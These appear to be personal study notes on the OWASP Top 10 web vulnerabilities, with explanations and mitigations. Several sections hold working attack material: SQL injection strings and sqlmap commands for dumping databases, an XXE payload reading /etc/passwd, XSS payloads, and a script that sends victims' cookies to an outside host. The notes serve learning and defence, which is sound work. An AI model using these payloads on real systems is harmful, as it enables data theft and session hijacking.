# OWASP Top 10 (Open Web Application Security Project)

1. Injection
2. Broken Authentication
3. Sensitive Data Exposure
4. XML Ecternal Entity
5. Broken Access Control
6. Security Misconfiguration
7. Cross-site Scripting
8. Insecure Deserialization
9. Components with Known Vulnerabilities
10. Insufficient Logging & Monitoring

## 1. Injection

SQL Injection
* occurs when user controlled input is passed to SQL queries
* can pass in SQL queries to manipulate the outcome of queries
* access, modify, delete info in database

Command Injection
* occurs when user input is passed to system commands
* can execute arbitrary system commands (whoami, lsb_release, etc.)
* allow to gain access to users system

Mitigate
* use allow / whitelist = only accepted input is processed
* strip input = if input contains dangerous characters, they are removed before processing



```
Basic statement
> SELECT name, description FROM products WHERE id=9;

Comments done either with # or --

#10.124.211.96/newsdetails.php?id=26 or 2=2; -- -
#10.124.211.96/newsdetails.php?id=26 UNION SELECT 'null1'; -- -
#' or 1=1; -- -  | try this in login form


#SELECT description FROM items WHERE id=' ' UNION SELECT user (); -- -';


SQLMap -tool

#sqlmap -u <URL> -p <injection parameters> [options]
#sqlmap -u 'http://vitim.site/view.php?id=1141' -p id --technique=U 
	-uses UNION based SQLi

#sqlmap -u 'http://victim.site/view.php?id=1141' --tables
	-prints all the tables

#sqlmap -u 'http://victim.site/view.php?id=1141' --current-db <name> --columns
#sqlmap -u 'http://victim.site/view.php?id=1141' --current-db <name> --dump


-if you find credentials to test against SQL server
#mysql -u <username> -p<password> -h <ip>
#use <username>_accounts;
#show tables;
#select * from accounts;

```

## 2. Broken Authentication

Common flaws in authentication mechanisms
* brute force attacks
* use of weak credentials
* weak session cookies
  * if predictable values

Mitigate
* enforce strong password policy
* automatic lockout after X attempts
* Multi Factor Authentication
* sanitize the input(username & password) = can't create new user "<space>admin"


## 3. Sensitive Data Exposure
* data directly linked to customer, usernames, passwords
* can be accidental leak or MITM

## 4. XML Ecternal Entity
* XXE
* abuses features of XML parsers or data
* allows to interact with any backend or external systemss that the app itself can access
* can also cause DoS or Server-Side Request Forgery (SSRF)
* may also enable port scanning and lead to RCE
* in-band XXE = receive an immediate response to the XXE payload
* out-of-band XXE (OOB-XXE / blind XXE) = no immediate response from we app, have to reflect the output to some other file on their own server

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

## 5. Broken Access Control
* visitor able to access protected page(s) that they are not authorised to view
  * being able to view sensitive info
  * accessing unauthorized functionality
* OWASP scenarios
  * Scenario 1

```
The application uses unverified data in a SQL call that is accessing account information:
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );

An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.
http://example.com/app/accountInfo?acct=notmyacct
```
  * Scenario 2
```
An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
```

* IDOR - Insecure Direct Object Reference
  * IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access
  * If the site incorrectly configured user could just change https://site.com/account=1 to https://site.com/account=2

## 6. Security Misconfiguration
* permissions configured poorly on cloud services (S3 bucket)
* unneeded services, pages, accounts or privileges enabled
* default accounts/passwords
* overly detailed error messages
* not using HTTP security headers

## 7. Cross-Site Scripting (XSS)
* type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine
* web app vulnerable to XSS if it doesn't sanitize user input
* XXS is possible on Javascript, VBScript, Flash, CSS
* Types of XX
  * Stored XSS
    * most dangerous XSS, malicious string inserted into the database (so the string originates from the websites db)
  * Reflected XSS 
    * malicious payload part of victims request to the website
    * site includes this payload in response back to the user
    * basically trick the user in clicking URL to execute malicious payload
  * DOM-Based XSS
    * DOM - Document Object Model, programming interface for HTML and XML docs
    * represents the page so that programs can change the document structure, style and content
 * XXS Payloads, commons
  * (<script>alert(“Hello World”)</script>) - creates popup
  * (document.write) - Override the website's HTML to add your own
  * (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - XSS keylogger
  * (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - local port scanner

```
- search/comment boxes should be tested first
- <h1>Hi</h1> -will test if input is sanitized or not
- test if javascript allowed <script>alert('XSS');</script>
- print out cookies <script>alert(document.cookie);</script>
- steal others cookies > use 'firebug' to login with that cookie

-cookies to another pc
<script>
var i = new Image();
i.src="http://192.168.99.11/get.php?cookies="+document.cookie;
</script>

-once you get cookie use firebug or "shift + F9" > storage > insert cookie in session

Replace HTML: <script>document.querySelector('#thm-title').textContent = 'My text here'</script>
```

## 8. Insecure Deserialization
* replacing data processed by an application with malicious code
* allows anything from DoS to RCE
* no reliable tool/framework - exploit only as dangerous as attackers skills
* any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained
  * E-Commerce Sites, Forums, APIs, Application runtimes (tomcat, jenkins...)
* cookies on FF = inspect element > storage
* https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3

## 9. Components with Known Vulnerabilities
* easy to miss an update
* you can search for "application X.X" and find exploits
* or exploit-db.com

## 10. Insufficient Logging and Monitoring
* What you should log:
  * HTTP status codes
  * Time Stamps
  * Usernames
  * API endpoints/page locations
  * IP addresses
* logging important, actions can be traced, risk and impact can be then determined
* if no logging: regulatory damage, risk of further attacks

